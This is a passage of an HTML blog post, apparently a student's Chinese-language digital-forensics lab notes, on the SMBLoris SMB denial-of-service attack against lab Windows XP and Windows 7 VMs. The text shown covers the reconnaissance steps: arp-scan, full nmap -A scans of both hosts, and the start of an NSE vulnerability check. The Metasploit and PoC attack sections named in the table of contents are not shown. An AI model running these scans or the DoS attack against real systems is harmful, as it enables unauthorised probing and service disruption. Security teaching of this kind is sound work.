@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="zh-TW" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>數位鑑識筆記 - SMBLoris | SUSU's BLOG</title><meta name="description" content="數位鑑識筆記 - SMBLoris"><meta name="keywords" content="Digital forensics,Linux"><meta name="author" content="SUSU"><meta name="copyright" content="SUSU"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="google-site-verification=BVjq85QtM1ejI-lD_4FfPiOJGFi_y_396uGllb_WK78"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="數位鑑識筆記 - SMBLoris"><meta name="twitter:description" content="數位鑑識筆記 - SMBLoris"><meta name="twitter:image" content="https://imgur.com/ZbnCCYY.jpg"><meta property="og:type" content="article"><meta property="og:title" content="數位鑑識筆記 - SMBLoris"><meta property="og:url" content="https://sunick2009.github.io/2022/03/05/digital_forensics_2022_03_05/"><meta property="og:site_name" content="SUSU's BLOG"><meta property="og:description" content="數位鑑識筆記 - SMBLoris"><meta property="og:image" content="https://imgur.com/ZbnCCYY.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
+var t = Cookies.get("theme");
+if (autoChangeMode == '1'){
+const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+if (t === undefined){
+  if (isLightMode) activateLightMode()
+  else if (isDarkMode) activateDarkMode()
+  else if (isNotSpecified || hasNoSupport){
+    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+    now = new Date();
+    hour = now.getHours();
+    isNight = hour < 6 || hour >= 18
+    isNight ? activateDarkMode() : activateLightMode()
+}
+} else if (t == 'light') activateLightMode()
+else activateDarkMode()
+
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://sunick2009.github.io/2022/03/05/digital_forensics_2022_03_05/"><link rel="next" title="數位鑑識筆記 - Shellshock" href="https://sunick2009.github.io/2021/12/05/digital_forensics_2021_12_05/"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-158679472-1', 'auto');
+ga('send', 'pageview');
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查詢的內容:${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  copy: {
+    success: '複製成功',
+    error: '複製錯誤',
+    noSupport: '瀏覽器不支持'
+  },
+  bookmark: {
+    title: 'Snackbar.bookmark.title',
+    message_prev: '按',
+    message_next: '鍵將本頁加入書籤'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: false,
+  isHome: false,
+  isPost: true
+  
+}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="SUSU's BLOG" type="application/atom+xml">
+</head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">SUSU's BLOG</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="/message%20board/"><i class="fa-fw fa fa-comments"></i><span> 留言板</span></a></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://imgur.com/BwKsEfG.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">5</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">標籤</div><div class="length_num">8</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分類</div><div class="length_num">2</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="/message%20board/"><i class="fa-fw fa fa-comments"></i><span> 留言板</span></a></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目錄</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#導言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">導言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#主題"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">主題</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#攻擊"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">攻擊</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#需先準備軟體"><span class="toc_mobile_items-number">3.0.1.</span> <span class="toc_mobile_items-text">需先準備軟體</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#攻擊流程"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">攻擊流程</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#1-使用arp-scan找到我們的目標主機"><span class="toc_mobile_items-number">3.1.1.</span> <span class="toc_mobile_items-text">1. 使用arp-scan找到我們的目標主機</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#2-使用nmap尋找目標主機有哪些服務"><span class="toc_mobile_items-number">3.1.2.</span> <span class="toc_mobile_items-text">2.使用nmap尋找目標主機有哪些服務</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#3-檢查漏洞"><span class="toc_mobile_items-number">3.1.3.</span> <span class="toc_mobile_items-text">3.檢查漏洞</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#4-攻擊"><span class="toc_mobile_items-number">3.1.4.</span> <span class="toc_mobile_items-text">4.攻擊</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#利用metaspolit"><span class="toc_mobile_items-number">3.1.4.1.</span> <span class="toc_mobile_items-text">利用metaspolit</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#利用PoC"><span class="toc_mobile_items-number">3.1.4.2.</span> <span class="toc_mobile_items-text">利用PoC</span></a></li></ol></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#鑑識"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">鑑識</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#需先準備軟體-v2"><span class="toc_mobile_items-number">4.0.1.</span> <span class="toc_mobile_items-text">需先準備軟體</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#Win-7"><span class="toc_mobile_items-number">4.0.2.</span> <span class="toc_mobile_items-text">Win 7</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#Win-XP"><span class="toc_mobile_items-number">4.0.3.</span> <span class="toc_mobile_items-text">Win XP</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#解決方法"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">解決方法</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#1"><span class="toc_mobile_items-number">5.0.1.</span> <span class="toc_mobile_items-text">1.</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#2"><span class="toc_mobile_items-number">5.0.2.</span> <span class="toc_mobile_items-text">2.</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#參考資料來源"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">參考資料來源</span></a></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目錄</div><div class="sidebar-toc__progress"><span class="progress-notice">你已經讀了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#導言"><span class="toc-number">1.</span> <span class="toc-text">導言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#主題"><span class="toc-number">2.</span> <span class="toc-text">主題</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻擊"><span class="toc-number">3.</span> <span class="toc-text">攻擊</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#需先準備軟體"><span class="toc-number">3.0.1.</span> <span class="toc-text">需先準備軟體</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻擊流程"><span class="toc-number">3.1.</span> <span class="toc-text">攻擊流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-使用arp-scan找到我們的目標主機"><span class="toc-number">3.1.1.</span> <span class="toc-text">1. 使用arp-scan找到我們的目標主機</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-使用nmap尋找目標主機有哪些服務"><span class="toc-number">3.1.2.</span> <span class="toc-text">2.使用nmap尋找目標主機有哪些服務</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-檢查漏洞"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.檢查漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-攻擊"><span class="toc-number">3.1.4.</span> <span class="toc-text">4.攻擊</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#利用metaspolit"><span class="toc-number">3.1.4.1.</span> <span class="toc-text">利用metaspolit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用PoC"><span class="toc-number">3.1.4.2.</span> <span class="toc-text">利用PoC</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#鑑識"><span class="toc-number">4.</span> <span class="toc-text">鑑識</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#需先準備軟體-v2"><span class="toc-number">4.0.1.</span> <span class="toc-text">需先準備軟體</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Win-7"><span class="toc-number">4.0.2.</span> <span class="toc-text">Win 7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Win-XP"><span class="toc-number">4.0.3.</span> <span class="toc-text">Win XP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解決方法"><span class="toc-number">5.</span> <span class="toc-text">解決方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1"><span class="toc-number">5.0.1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-number">5.0.2.</span> <span class="toc-text">2.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#參考資料來源"><span class="toc-number">6.</span> <span class="toc-text">參考資料來源</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://imgur.com/ZbnCCYY.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">數位鑑識筆記 - SMBLoris</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 發表於 2022-03-05<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新於 2022-12-04</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E7%AD%86%E8%A8%98/">筆記</a></span><div class="post-meta-wordcount"><i class="fa fa-file-word-o post-meta__icon fa-fw" aria-hidden="true"></i><span>字數總計:</span><span class="word-count">2.7k</span><span class="post-meta__separator">|</span><i class="fa fa-clock-o post-meta__icon fa-fw" aria-hidden="true"></i><span>閲讀時長: 12 分鐘</span><div class="post-meta-pv-cv"><span class="post-meta__separator">|</span><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>閲讀量:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h2 id="導言">導言</h2>
+<p>雖然上次說要把每次老師教的課程做紀錄<br>
+但每次上課不一定有教新的漏洞，有時比較偏向單純的鑑識<br>
+在系統裡找犯罪的痕跡，不太好寫一篇報告<br>
+不過這學期仍有相關的課，那我就來把學到的攻擊做一遍練習吧</p>
+<hr>
+<h2 id="主題">主題</h2>
+<p>這次練習的是<a href="https://www.secpod.com/blog/smbloris/" target="_blank" rel="noopener">SMBLoris</a><br>
+已經消失的<a href="https://web.archive.org/web/20190329104319/http://smbloris.com/" target="_blank" rel="noopener">官網</a>這邊用<em><a href="http://archive.org" target="_blank" rel="noopener">archive.org</a></em>找出來給大家看<br>
+由@zerosum0x0 &amp; @JennaMagius 所發現<br>
+基本上是透過攻擊SMB服務，透過每次傳送最大的上限的封包，來佔用對方伺服器的CPU、記憶體性能<br>
+屬於<strong>DoS</strong>類型的攻擊</p>
+<p>甚麼是<em>SMB</em>?? <a href="https://bit.ly/3vKEndw" target="_blank" rel="noopener">參考這個</a><br>
+簡單來說就是windows的區域網「檔案、印表機」通訊及分享系統<br>
+不過Linux上也有一套逆向工程出來的<strong>Samba</strong><br>
+理論上影響著所有使用SMB協議的機器被開發出來</p>
+<p>這次的受害環境有講師提供的<em>WindowsXP SP3</em>模擬機<br>
+分配的資源是1 CORE 1 GB Memory<br>
+還有<em>Windows 7 SP1</em>的模擬機<br>
+分配的資源是4 CORE 3 GB Memory<br>
+安全措施盡可能地關閉</p>
+<hr>
+<h2 id="攻擊">攻擊</h2>
+<h4 id="需先準備軟體">需先準備軟體</h4>
+<ol>
+<li><strong>nmap</strong></li>
+<li><strong>arp-scan</strong></li>
+<li><strong>metasploit</strong></li>
+<li><strong>GCC</strong></li>
+<li><strong>SMBLoris</strong> <a href="https://bit.ly/3KlCIz0" target="_blank" rel="noopener"><strong>POC</strong></a><br>
+基本上準備個Kali Linux就能操作這次攻擊<br>
+<em>GCC</em>是要用來編譯攻擊程式</li>
+</ol>
+<h3 id="攻擊流程">攻擊流程</h3>
+<h4 id="1-使用arp-scan找到我們的目標主機">1. 使用<strong>arp-scan</strong>找到我們的目標主機</h4>
+<p>這一步也可使用各種工具找到對方即可<br>
+或是直接在目標主機輸入ifconfig(<s>偷吃步</s></p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo arp-scan -l         </span></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:18:1d:29, IPv4: 192.168.85.130</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.85.1	00:50:56:c0:00:01	VMware, Inc.</span><br><span class="line">192.168.85.129	00:0c:29:e3:ab:54	VMware, Inc.  &lt;------這次的目標XP</span><br><span class="line">192.168.85.131	00:0c:29:4d:0a:b6	VMware, Inc.  &lt;------這次的目標Win7</span><br><span class="line">192.168.85.254	00:50:56:f2:b3:9f	VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.137 seconds (119.79 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure></div>
+<h4 id="2-使用nmap尋找目標主機有哪些服務">2.使用nmap尋找目標主機有哪些服務</h4>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -A 192.168.85.129    </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 20:06 CST</span><br><span class="line">Nmap scan report for 192.168.85.129</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds  Windows XP microsoft-ds</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -3h59m59s, deviation: 5h39m23s, median: -7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: JIMMY-B91C1364D, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:e3:ab:54 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows XP (Windows 2000 LAN Manager)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_xp::-</span><br><span class="line">|   Computer name: jimmy-b91c1364d</span><br><span class="line">|   NetBIOS computer name: JIMMY-B91C1364D\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2022-03-05T20:06:55+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 72.21 seconds</span><br></pre></td></tr></table></figure></div>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -A 192.168.85.131    </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 20:15 CST</span><br><span class="line">Nmap scan report for 192.168.85.131</span><br><span class="line">Host is up (0.0090s latency).</span><br><span class="line">Not shown: 986 closed ports</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds       Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">554/tcp   open  rtsp?</span><br><span class="line">2869/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">| ssl-cert: Subject: commonName=WIN-FCFV8BPF54U</span><br><span class="line">| Not valid before: 2022-03-03T17:44:03</span><br><span class="line">|_Not valid after:  2022-09-02T17:44:03</span><br><span class="line">|_ssl-date: 2022-03-05T12:18:57+00:00; 0s from scanner time.</span><br><span class="line">7070/tcp  open  ssl/realserver?</span><br><span class="line">| ssl-cert: Subject: commonName=AnyDesk Client</span><br><span class="line">| Not valid before: 2020-09-12T17:39:21</span><br><span class="line">|_Not valid after:  2070-08-31T17:39:21</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">10243/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49159/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49160/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">Service Info: Host: WIN-FCFV8BPF54U; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 3h59m59s, median: -1s</span><br><span class="line">|_nbstat: NetBIOS name: WIN-FCFV8BPF54U, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:4d:0a:b6 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1</span><br><span class="line">|   Computer name: WIN-FCFV8BPF54U</span><br><span class="line">|   NetBIOS computer name: WIN-FCFV8BPF54U\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2022-03-05T20:17:53+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-03-05T12:17:53</span><br><span class="line">|_  start_date: 2022-03-05T11:55:45</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 197.37 seconds</span><br></pre></td></tr></table></figure></div>
+<h4 id="3-檢查漏洞">3.檢查漏洞</h4>
+<p>我們可得知這兩部主機上皆有SMB服務在<em>PORT 445</em>上運行<br>
+由於這次的這個漏洞似乎不被微軟重視，理論上普遍存在所有利用SMB通訊的程式<br>
+不過你仍可以用nmap 腳本<a href="https://github.com/cldrn/external-nse-script-library/blob/master/smb-smbloris.nse" target="_blank" rel="noopener"><strong>NSE</strong></a>來檢查<br>
+這邊以掃XP舉例</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sV --script /home/susu/smb-smbloris.nse 192.168.85.129 </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 14:38 CST</span><br><span class="line">Nmap scan report for 192.168.85.129</span><br><span class="line">Host is up (0.0036s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span 